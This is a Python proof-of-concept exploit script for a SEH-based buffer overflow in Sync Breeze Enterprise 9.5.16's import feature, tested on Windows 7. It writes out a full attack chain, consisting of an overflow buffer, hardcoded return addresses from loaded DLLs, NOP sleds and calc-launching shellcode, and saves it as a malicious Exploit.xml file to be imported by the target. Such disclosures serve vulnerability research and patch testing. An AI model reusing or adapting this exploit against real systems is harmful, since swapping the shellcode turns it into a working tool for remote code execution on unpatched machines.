#!/usr/bin/env python

# Exploit Title: Sync Breeze Enterprise 9.5.16 - 'Import Command' Buffer Overflow (SEH)
# Date: 2017-03-29
# Exploit Author: Daniel Teixeira
# Author Homepage: www.danielteixeira.com
# Vendor Homepage: http://www.syncbreeze.com
# Software Link: http://www.syncbreeze.com/setups/syncbreezeent_setup_v9.5.16.exe
# Version: 9.5.16
# Tested on: Windows 7 SP1 x86

import os,struct

#Buffer overflow
junk = "A" * 1536

#JMP ESP (QtGui4.dll)
jmpesp= struct.pack('<L',0x651bb77a)

#NOPS
nops = "\x90"

#LEA   EAX, [ESP+76]
esp = "\x8D\x44\x24\x4C"
#JMP ESP
jmp = "\xFF\xE0"

#JMP Short = EB 05
nSEH = "\x90\x90\xEB\x05" #Jump short 5
#POP POP RET (libspp.dll)
SEH = struct.pack('<L',0x10015FFE)

#CALC.EXE
shellcode =  "\x31\xdb\x64\x8b\x7b\x30\x8b\x7f\x0c\x8b\x7f\x1c\x8b\x47\x08\x8b\x77\x20\x8b\x3f\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x89\xdd\x8b\x34\xaf\x01\xc6\x45\x81\x3e\x43\x72\x65\x61\x75\xf2\x81\x7e\x08\x6f\x63\x65\x73\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x89\xd9\xb1\xff\x53\xe2\xfd\x68\x63\x61\x6c\x63\x89\xe2\x52\x52\x53\x53\x53\x53\x53\x53\x52\x53\xff\xd7"

#PAYLOAD
payload = junk + jmpesp + nops * 16 + esp + jmp + nops * 68 + nSEH + SEH + nops * 10 + shellcode + nops * 5000

#FILE
file='<?xml version="1.0" encoding="UTF-8"?>\n<classify\nname=\'' + payload + '\n</classify>'

f = open('Exploit.xml', 'w')
f.write(file)
f.close()